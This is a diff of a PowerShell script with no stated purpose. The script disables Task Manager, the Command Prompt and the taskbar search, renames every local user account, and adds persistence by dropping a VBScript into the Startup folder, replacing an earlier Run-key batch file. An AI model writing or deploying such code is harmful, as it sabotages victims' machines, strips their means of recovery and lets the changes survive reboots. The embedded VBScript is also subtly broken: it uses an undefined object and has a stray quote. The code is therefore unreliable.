@@ -32,6 +32,11 @@ $disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\
 New-Item -Path $disableTaskMgrPath -Force | Out-Null
 Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
 
+# Create registry key to disable Command Prompt
+$disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
+New-Item -Path $disableCmdPath -Force | Out-Null
+Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
+
 # Create registry key to disable Search Bar in taskbar
 $searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
 New-Item -Path $searchBarPath -Force | Out-Null
@@ -44,25 +49,14 @@ foreach ($user in $users) {
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
-# Create batch file to run a specific line of code
-$batchFilePath = Join-Path -Path $desktopPath -ChildPath "AutoExecute.bat"
-$lineOfCode = '@echo off
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-'
-$batchFileContent = "@echo off`n$lineOfCode"
+# Create VBScript file
+$vbsScript = @"
+objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True"
+"@
 
-$batchFileContent | Out-File -FilePath $batchFilePath -Encoding ASCII
-
-# Add registry key to start the batch file on startup
-$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regKeyName = "AutoExecuteScript"
-$regKeyValue = "$batchFilePath"
-Set-ItemProperty -Path $regKeyPath -Name $regKeyName -Value $regKeyValue
-
-# Start the batch file immediately
-Start-Process -FilePath $batchFilePath
-
+$vbsFilePath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\script.vbs")
+Set-Content -Path $vbsFilePath -Value $vbsScript
 
 $source = @"
 using System;
